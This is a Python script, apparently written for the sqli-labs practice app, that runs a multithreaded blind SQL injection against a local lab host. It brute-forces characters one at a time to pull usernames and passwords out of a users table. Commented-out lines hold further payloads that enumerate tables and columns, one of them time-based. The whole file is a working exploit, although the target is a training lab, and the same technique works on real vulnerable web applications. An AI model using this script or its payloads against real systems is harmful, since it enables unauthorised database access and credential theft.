import requests
import threading
from queue import Queue

res = ''

s = requests.session()


class Start(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        global res
        queue = self.queue
        while not queue.empty():
            info = queue.get()
            num = info[0]
            word = info[1]

            # payload = f'http://192.168.100.100:8080/Less-8/?id=1' and (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{num},1))={word})--+'
            # payload = f'http://192.168.100.100:8080/Less-5/?id=1%27%20and%20if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),{num},1))={word},sleep(5),1)--+'
            payload = f'http://192.168.100.100:8080/Less-8/?id=1 and (ascii(substr((select(group_concat(id,username,password))from users),{num},1))={word})--+'
            result = s.get(payload)

            if 'You are in...........' in result.text:
                res += chr(word)
                print(res)


def get_text():
    queue = Queue()
    for i in range(50):
        for j in range(32, 127):
            queue.put([i, j])

    thread_count = 64
    threads = []

    for i in range(0, thread_count):
        thread = Start(queue)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    get_text()
